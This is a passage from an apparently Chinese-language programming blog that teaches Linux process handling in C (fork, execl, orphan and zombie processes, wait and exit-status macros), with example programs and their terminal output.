class="line">	&#125;</span><br><span class="line">	pid = fork(); <span class="comment">//从此开始生成子进程，父子都会从此返回，根据返回值区分父子进程</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span> ) &#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123; <span class="comment">//父进程返回子进程的PID</span></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"I'm parent pid = %d, parentID = %d\n"</span>, getpid(), getppid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;  <span class="comment">//子进程返回0</span></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"child  pid = %d, parentID=%d \n"</span>, getpid(), getppid());</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"i = %d\n"</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行结果如下：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面# ./fork</span><br><span class="line">--------i = 0</span><br><span class="line">--------i = 1</span><br><span class="line">--------i = 2</span><br><span class="line">--------i = 3</span><br><span class="line">I'm parent pid = 10345, parentID = 1426</span><br><span class="line">i = 0</span><br><span class="line">i = 1</span><br><span class="line">i = 2</span><br><span class="line">i = 3</span><br><span class="line">child  pid = 10346, parentID=10345 </span><br><span class="line">i = 0</span><br><span class="line">i = 1</span><br><span class="line">i = 2</span><br><span class="line">i = 3</span><br></pre></td></tr></table></figure>



<p><strong>父进程子进程是单独执行的，但2者会共享文件</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, n = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> counter=<span class="number">200</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        counter+=<span class="number">200</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"first process, pid = %d \n"</span>, getpid());</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--counter = %d \n"</span>,counter);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        counter+=<span class="number">200</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"second process, pid = %d \n"</span>, getpid());</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--counter = %d \n"</span>,counter);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">2</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        counter+=<span class="number">200</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"third process, pid = %d \n"</span>, getpid());</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--counter = %d \n"</span>,counter);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == n) </span><br><span class="line">        &#123;</span><br><span class="line">        counter+=<span class="number">400</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"parent process, pid = %d \n"</span>, getpid());</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"--counter = %d \n"</span>,counter);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行结果：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面# ./fork2</span><br><span class="line">first process, pid = 10523 </span><br><span class="line">--counter = 400 </span><br><span class="line">parent process, pid = 10522 </span><br><span class="line">--counter = 600 </span><br><span class="line">second process, pid = 10524 </span><br><span class="line">--counter = 400 </span><br><span class="line">third process, pid = 10525 </span><br><span class="line">--counter = 400</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid, wpid;</span><br><span class="line">	<span class="keyword">int</span> status;</span><br><span class="line">	<span class="keyword">int</span> fd=<span class="built_in">open</span>(<span class="string">"hello"</span>,O_RDWR|O_CREAT,<span class="number">0777</span>); <span class="comment">//打开hello文件，不存就就创建它</span></span><br><span class="line">    <span class="comment">//O_RDWR | O_CREAT  参数表示创建该文件，且以读写的方式打开   0777定义创建文件的权限，文件的权限都是8进制数（以0开头的数），0777等价于777</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"open error\n"</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">"fork error"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;		<span class="comment">//son</span></span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">		lseek(fd,<span class="number">0</span>,SEEK_SET);</span><br><span class="line">		<span class="keyword">int</span> len=<span class="built_in">read</span>(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line">		<span class="built_in">close</span>(fd);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">char</span> *p=<span class="string">"aaaaaaaaaaaaaabbbbbbbbbbbbbcccccccccccccccc"</span>;</span><br><span class="line">		<span class="built_in">write</span>(fd,p,<span class="built_in">strlen</span>(p)+<span class="number">1</span>);</span><br><span class="line">		<span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="exec函数族"><a href="#exec函数族" class="headerlink" title="exec函数族"></a><strong>exec函数族</strong></h3><p><strong>让父子进程执行不相干的操作</strong></p>
<p><strong>如果函数执行成功，不返回值</strong></p>
<p><strong>如果执行失败，打印错误信息，退出当前进程</strong></p>
<p><strong>本质是替换代码块.text中的内容，无需再创建新进程</strong></p>
<p><strong>execl ：执行ls -lah 的时候，就替换了后续的for循环，当ls执行结束的时候，就直接推出了，所以这里for循环仅执行1次</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">print</span>(xxxxx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">pid_t</span> pid=fork(); <span class="comment">//创建子进程</span></span><br><span class="line"><span class="keyword">if</span>(pid==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	execl(<span class="string">"/bin/ls"</span>,<span class="string">"666"</span>,<span class="string">"-lah"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"++++++ i=%d\n"</span>,i);   <span class="comment">///仅执行一次</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span> ) &#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"I'm parent pid = %d, parentID = %d\n"</span>, getpid(), getppid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"i am child\n"</span>);</span><br><span class="line">        execl(<span class="string">"/bin/ls"</span>, <span class="string">"ls"</span>, <span class="string">"-l"</span>,  <span class="literal">NULL</span>);<span class="comment">//一般执行自己写的程序，参数写完后加NULL</span></span><br><span class="line">        perror(<span class="string">"exec"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------finish...%d\n"</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面# ./execl_1 </span><br><span class="line">I'm parent pid = 11329, parentID = 1426</span><br><span class="line">-------finish...11329</span><br><span class="line">root@kali:~/桌面# i am child</span><br><span class="line">总用量 56504</span><br><span class="line">drwxrwxrwx  2 root root     4096 4月  22 17:59 chj</span><br><span class="line">-rwxr-xr-x  1 root root    17024 5月   1 21:45 execl_1</span><br><span class="line">-rw-r--r--  1 root root      512 5月   1 21:45 execl_1.c</span><br><span class="line">-rwxr-xr-x  1 root root     3826 11月 14 04:55 firefox-esr.desktop</span><br><span class="line">-rwxr-xr-x  1 root root    16872 4月  20 21:12 fork</span><br><span class="line">-rwxr-xr-x  1 root root    16720 4月  20 21:39 fork2</span><br><span class="line">-rw-r--r--  1 root root      796 4月  20 21:39 fork2.c</span><br><span class="line">-rwxr-xr-x  1 root root    17120 5月   1 20:26 fork3</span><br><span class="line">-rw-r--r--  1 root root      679 5月   1 20:25 fork3.c</span><br><span class="line">-rw-r--r--  1 root root      527 4月  20 21:12 fork.c</span><br><span class="line">-rwxr-xr-x  1 root root     8430 4月   2 20:55 google-chrome.desktop</span><br><span class="line">-rwxr-xr-x  1 root root       44 5月   1 20:28 hello</span><br><span class="line">-rw-r--r--  1 root root      181 4月  21 20:02 test.php</span><br></pre></td></tr></table></figure>



<p><strong>孤儿进程：</strong></p>
<p><strong>父进程结束，子进程还在，则子进程的父进程编程init进程</strong></p>
<p><strong>目的：为了释放子进程占用的系统资源</strong></p>
<p><strong>子进程释放不了pcb，必须由父进程释放</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">	pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span> ) &#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		 <span class="built_in">printf</span>(<span class="string">"I'm parent pid = %d, parentID = %d\n"</span>, getpid(), getppid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">         sleep(<span class="number">1</span>);</span><br><span class="line">		 <span class="built_in">printf</span>(<span class="string">"child  pid = %d, parentID=%d \n"</span>, getpid(), getppid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面# ./wait_1 </span><br><span class="line">I'm parent pid = 11675, parentID = 1426</span><br><span class="line">root@kali:~/桌面# child  pid = 11676, parentID=1</span><br></pre></td></tr></table></figure>



<p><strong>僵尸进程：</strong></p>
<p><strong>子进程结束，父进程还在，但父进程不释放子进程的pcb</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">	pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span> ) &#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) </span><br><span class="line">		&#123;</span><br><span class="line">			sleep(<span class="number">1</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"I'm parent pid = %d, parentID = %d\n"</span>, getpid(), getppid());</span><br><span class="line">		&#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; </span><br><span class="line">		 <span class="built_in">printf</span>(<span class="string">"child  pid = %d, parentID=%d\n"</span>, getpid(), getppid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><strong>wait（int *status）</strong></p>
<p><strong>函数作用：</strong></p>
<p><strong>1.阻塞并等待子进程退出</strong></p>
<p><strong>2.回收子进程残留资源</strong></p>
<p><strong>3.获取子进程结束状态（退出原因）</strong></p>
<p><strong>返回值：</strong></p>
<p><strong>成功：清理掉的子进程ID</strong></p>
<p><strong>失败：-1（没有子进程）</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid, wpid;</span><br><span class="line">	<span class="keyword">int</span> status;</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">-1</span>)&#123;</span><br><span class="line">		perror(<span class="string">"fork error"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;		<span class="comment">//son</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"I'm process child, pid = %d\n"</span>, getpid());</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1</span></span><br><span class="line">		execl(<span class="string">"./abnor"</span>, <span class="string">"abnor"</span>, <span class="literal">NULL</span>);</span><br><span class="line">		perror(<span class="string">"execl error"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		sleep(<span class="number">1</span>);				</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">10</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//wpid = wait(NULL);	//传出参数</span></span><br><span class="line">		wpid = wait(&amp;status);	<span class="comment">//传出参数</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(WIFEXITED(status))&#123;	<span class="comment">//非0 ---正常退出</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"I'm parent, The child process "</span></span><br><span class="line">					<span class="string">"%d exit normally\n"</span>, wpid);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"return value:%d\n"</span>, WEXITSTATUS(status));</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;	<span class="comment">//非0 ----异常退出</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"The child process exit abnormally, "</span></span><br><span class="line">					<span class="string">"killed by signal %d\n"</span>, WTERMSIG(status));</span><br><span class="line">										<span class="comment">//获取信号编号</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"other...\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *p = <span class="string">"test of wait abnormally\n"</span>;</span><br><span class="line"><span class="comment">//    p[0] = 'h';</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>/<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">56</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面# ./wait</span><br><span class="line">I'm process child, pid = 12083</span><br><span class="line">The child process exit abnormally, killed by signal 8</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid,wpid;       <span class="comment">//进程标识符</span></span><br><span class="line"> 	<span class="keyword">int</span> status;</span><br><span class="line">	pid = fork();     <span class="comment">//创建一个新的进程</span></span><br><span class="line">	<span class="keyword">if</span>(pid&lt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"创建进程失败!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)   <span class="comment">//子进程1</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"----子进程1----进程标识符是%d\n"</span>,getpid());</span><br><span class="line">		execl(<span class="string">"/bin/ls"</span>,<span class="string">"ls"</span>,<span class="string">"-1"</span>,<span class="string">"-color"</span>,<span class="literal">NULL</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"exec failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>          <span class="comment">//否则为父进程</span></span><br><span class="line">	&#123;</span><br><span class="line">		pid = fork();<span class="comment">//创建新进程</span></span><br><span class="line">		<span class="keyword">if</span>(pid&lt;<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"创建进程失败!"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)   <span class="comment">//子进程2</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"----子进程2----进程标识符是%d\n"</span>,getpid());</span><br><span class="line">			execl(<span class="string">"/bin/ls"</span>,<span class="string">"ls"</span>,<span class="string">"-l"</span>,<span class="string">"-color"</span>,<span class="literal">NULL</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"exec failed!\n"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>          <span class="comment">//否则为父进程</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//wait(NULL); //对退出状态不关注，等待子进程退出</span></span><br><span class="line">			wpid = wait(&amp;status);	<span class="comment">//传出参数</span></span><br><span class="line">	    	<span class="keyword">if</span>(WIFEXITED(status))</span><br><span class="line">			&#123;	<span class="comment">//非0 ---正常退出</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"I'm parent, The child process "</span></span><br><span class="line">					<span class="string">"%d exit normally\n"</span>, wpid);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"return value:%d\n"</span>, WEXITSTATUS(status));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"父进程,进程标识符是%d\n"</span>,getpid());</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"完成！\n"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;	<span class="comment">//非0 ----异常退出</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"The child process exit abnormally, "</span></span><br><span class="line">					<span class="string">"killed by signal %d\n"</span>, WTERMSIG(status));</span><br><span class="line">										<span class="comment">//获取信号编号</span></span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"other...\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		&#125;     </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# ./chj</span><br><span class="line">----子进程1----进程标识符是14091</span><br><span class="line">----子进程2----进程标识符是14092</span><br><span class="line">总用量 62160</span><br><span class="line">drwxr-xr-x 11 root     4096 4月   2 20:35 sqlmap</span><br><span class="line">-rw-r--r--  1 root      959 5月   2 15:50 process_sum.c</span><br><span class="line">-rwxr-xr-x  1 root    16928 5月   2 15:50 process_sum</span><br><span class="line">-rw-r--r--  1 root     1058 5月   2 16:12 jinchen.c</span><br><span class="line">-rwxr-xr-x  1 root    16920 5月   2 16:12 jinchen</span><br><span class="line">-rw-r--r--  1 root 63455210 4月   2 20:49 google-chrome-stable_current_amd64.deb</span><br><span class="line">-rw-r--r--  1 root     1507 5月   2 16:38 chj.c</span><br><span class="line">-rwxr-xr-x  1 root    16920 5月   2 16:38 chj</span><br><span class="line">总用量 62160</span><br><span class="line">drwxr-xr-x  9 root     4096 4月  25 10:49 antSword</span><br><span class="line">drwxr-xr-x  5 root    36864 5月   2 15:31 桌面</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 音乐</span><br><span class="line">drwxr-xr-x  3 root     4096 4月  25 11:01 下载</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 文档</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 图片</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 视频</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 模板</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 公共</span><br><span class="line">-rw-r--r--  1 root      985 5月   2 16:00 12.c</span><br><span class="line">-rw-r--r--  1 root      971 5月   2 16:12 123.c</span><br><span class="line">-rwxr-xr-x  1 root    16920 5月   2 16:12 123</span><br><span class="line">drwxr-xr-x 11 root     4096 4月   2 20:35 sqlmap</span><br><span class="line">-rwxr-xr-x  1 root    16912 5月   2 16:00 12</span><br><span class="line">-rw-r--r--  1 root      959 5月   2 15:50 process_sum.c</span><br><span class="line">-rwxr-xr-x  1 root    16928 5月   2 15:50 process_sum</span><br><span class="line">-rw-r--r--  1 root     1058 5月   2 16:12 jinchen.c</span><br><span class="line">-rwxr-xr-x  1 root    16920 5月   2 16:12 jinchen</span><br><span class="line">-rw-r--r--  1 root 63455210 4月   2 20:49 google-chrome-stable_current_amd64.deb</span><br><span class="line">-rw-r--r--  1 root     1507 5月   2 16:38 chj.c</span><br><span class="line">-rwxr-xr-x  1 root    16920 5月   2 16:38 chj</span><br><span class="line">drwxr-xr-x  9 root     4096 4月  25 10:49 antSword</span><br><span class="line">drwxr-xr-x  5 root    36864 5月   2 15:31 桌面</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 音乐</span><br><span class="line">drwxr-xr-x  3 root     4096 4月  25 11:01 下载</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 文档</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 图片</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 视频</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 模板</span><br><span class="line">drwxr-xr-x  2 root     4096 4月   1 19:21 公共</span><br><span class="line">-rw-r--r--  1 root      985 5月   2 16:00 12.c</span><br><span class="line">-rw-r--r--  1 root      971 5月   2 16:12 123.c</span><br><span 